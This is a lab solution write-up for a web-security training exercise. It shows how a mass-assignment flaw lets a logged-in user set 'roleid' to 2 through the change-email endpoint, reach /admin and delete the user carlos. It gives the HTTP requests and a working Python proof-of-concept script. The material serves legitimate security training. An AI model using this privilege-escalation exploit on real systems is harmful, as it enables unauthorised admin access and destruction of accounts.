This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

---

Request needed for exploit:
- Login with wiener account
- Reset email adding the id field set to 2
- Navigate to admin panel
- Delete user carlos

1. GET /login HTTP/2

```json
username=wiener&password=peter
```

2. POST /my-account/change-email HTTP/2
```json
{
"email":"test@test.com",
"roleid": 2
}
```


3. GET /admin HTTP/2

4. GET /admin/delete?username=carlos HTTP/2

I can probably skip the third step for the exploit, but we'll see.

PoC
_Author: z0d_
_10:06 2024-09-23_
```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def del_carlos(s, url):
	print('[+] Working......')
	del_acc_url = url + '/admin/delete?username=carlos'
	r = s.get(del_acc_url, verify=False, proxies=proxies)
	if 'User deleted successfully!' in r.text:
		print('[+] User successfully deleted! Exiting script.')
		
	else: 
		print('[-] Something went wrong....')
		sys.exit(-4)
		

def upgrade_to_admin(s, url):
	print('[+] Upgrading to admin account.')
	become_admin = url + '/my-account/change-email'
	data = {
		"email":"test@test.com",
		"roleid": 2
	}
	
	r = s.post(become_admin, json=data, verify=False, proxies=proxies)
	if 'Admin panel' in r.text:
		print('[+] Upgraded to admin. Deleting user Carlos...')
		del_carlos(s, url)
	else:
		print('[-] Exploit failed.')
		sys.exit(-3)
	

def log_account(s, url):
	print("[+] Logging into Wiener account.")
	login_url = url + "/login"
	data = {
		"username": "wiener",
		"password": "peter"
	}
	
	r = s.post(login_url, data=data, verify=False, proxies=proxies)
	if 'my-account?id=wiener' in r.text:
		upgrade_to_admin(s, url)
	else:
		print('[-] Unable to Login...')
		sys.exit(-2)


def main():
	if len(sys.argv) != 2:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		print('[+] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
	
	url = sys.argv[1]
	s = requests.Session()
	log_account(s, url)
		
if __name__  == '__main__':
	main()
```



